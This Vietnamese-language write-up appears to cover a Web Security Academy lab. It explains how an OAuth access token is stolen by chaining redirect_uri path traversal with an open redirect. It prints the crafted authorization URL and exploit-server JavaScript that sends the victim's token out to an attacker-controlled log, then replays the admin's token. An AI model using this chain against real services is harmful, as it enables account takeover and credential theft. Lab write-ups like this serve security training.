  <img width="1574" height="513" alt="image" src="https://github.com/user-attachments/assets/7c4ca80a-8d18-4bb2-bdc2-ccbf96cb41cd" />

  Ngoài ra, với GET request *GET /auth?client_id=[...]*, khi thực hiện thay đổi tham số *redirect_uri* trong rồi thực hiện gửi lại cho OAuth trong Repeater, ta nhận thấy   tham số này đang được xác thực theo một whitelist được đăng ký:

  <img width="1564" height="894" alt="image" src="https://github.com/user-attachments/assets/76de66fc-4fd4-4fd7-85d0-af9e1aa1bc69" />

  Tuy nhiên nếu ta sử dụng path traversall /../ như đã đề cập thì lại không gặp lỗi đó:

  <img width="1882" height="895" alt="image" src="https://github.com/user-attachments/assets/4b0d1798-bd04-4db4-bc5e-29d598f544c9" />

  Thực hiện tạo directory traversal là: */oauth-callback/../post?postId=1* (vì khi để post không và thực hiện gửi request sau đó redirect sẽ bị báo lỗi missing param       postId):

  <img width="1882" height="885" alt="image" src="https://github.com/user-attachments/assets/def3aa67-3c07-492d-8e14-314679b33359" />

  Khi thực hiện follow redirection, sẽ được chuyến hướng tới trang bài báo id = 1:

  <img width="1878" height="920" alt="image" src="https://github.com/user-attachments/assets/f2c47eaa-483a-424a-a276-41fc88ee60ff" />

  &rarr; Ta cũng để ý nhận thấy được rằng *access token* được bao gồm trong phần #fragment của URL.

  <img width="1880" height="511" alt="image" src="https://github.com/user-attachments/assets/73ed71d1-9ea3-4798-bbe7-7381d0281274" />

  Tiếp tục để ý thấy rằng trong mỗi bài post trong blog, có một tùy chọn là "Next post" để chuyển hướng sang bài viết tiếp theo, hoạt động bằng cách chuyển hướng người     dùng đến đường dẫn được chỉ định trong tham số truy vấn với GET request /post/next?path=[...]:

  <img width="1864" height="551" alt="image" src="https://github.com/user-attachments/assets/473e5c44-6c05-4ae4-a3b0-badebfd2ed46" />

  &rarr; lỗ hổng open redirect.

  Tận dụng open redirect như đã đề cập ở trên, ta tạo một URL sẽ khởi động một quy trình OAuth với redirect_uri trỏ đến chỗ open redirect như trên, sau đó thực hiện        chuyển tiếp đến exploit server của ta:

  ```
  https://oauth-0a6a004e041e9f2180fef1df026f00a9.oauth-server.net/auth?client_id=pzaphg5dxngdwfczpt306&redirect_uri=https://0a2500c104f59f5d8049f35700f6007c.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5c00c204979f178005f262010c0058.exploit-server.net/exploit&response_type=token&nonce=-1090283847&scope=openid%20profile%20email
  ```

  Kết quả khi thực hiện truy cập đường dẫn URl, ta sẽ tháy nó chuyển hướng về trang exploit server "Hello World!"

  <img width="1919" height="1005" alt="Screenshot 2025-08-28 013504" src="https://github.com/user-attachments/assets/b5ed51a7-8822-4ef0-95cd-d9bc38c5ce3e" />

  Cùng với đó ta để ý thấy rằng access token được trả về trong URL fragment.

  Trên exploit server, tại file /exploit ta tạo script:

  ```
  <script>
    window.location = '/?'+document.location.hash.substr(1)
  </script>
  ```

  Đoạn script trên thực hiện cắt bỏ ký tự #, ép browser redirect lại đến chính exploit server, nhưng lần này đưa fragment vào query string.

  Sau khi thực hiện truy cập lại đường dẫn URL như trên, ta sẽ thấy access token của mình trả về dưới dạng query string, không phải #fragment nữa, check trong access log   exploit server:

  <img width="1919" height="939" alt="image" src="https://github.com/user-attachments/assets/09f8010b-c972-4a92-be4e-b7d3087d6e0f" />

  Lúc này đề thực hiện lừa victim, ta tạo script trên file /exploit như sau:

  ```
  <script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a93003e035c3e4a804701f6025600f3.oauth-server.net/auth?client_id=qpt6rxflzicl92qi8gjnf&redirect_uri=https://0ace008903c23ee9805e03fd00b100df.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab8005a03573eba806202e40130008c.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
  </script>
  ```

  <img width="1919" height="943" alt="image" src="https://github.com/user-attachments/assets/d400dff9-4ebd-4a20-8ffb-69bd195572a1" />

  Sau đó thực hiện "Deliver exploit to victim" và chờ victim sập bẫy.

  Kiểm tra access log và ta đã nhận dược access token trả về của admin user:

  <img width="1919" height="943" alt="image" src="https://github.com/user-attachments/assets/7218cb64-60a9-44d7-af04-86620f840dc5" />

  Trong Burp Repeater, ta thực hiện gửi lại request /me trong đó phần *Authorization: Bearer* ta thay thế đi kèm với token ta vừa thu thập được của admin user:

  <img width="1864" height="847" alt="image" src="https://github.com/user-attachments/assets/41bb3a57-861f-427e-9e14-1d1472e5b419" />

  &rarr; Kết quả ta đã thực hiện API call thành công để lấy dữ liệu của nạn nhân, bao gồm cả khóa API của họ.

  


  

  

  

  


  

  



  

  

  


  



  

  
  
  




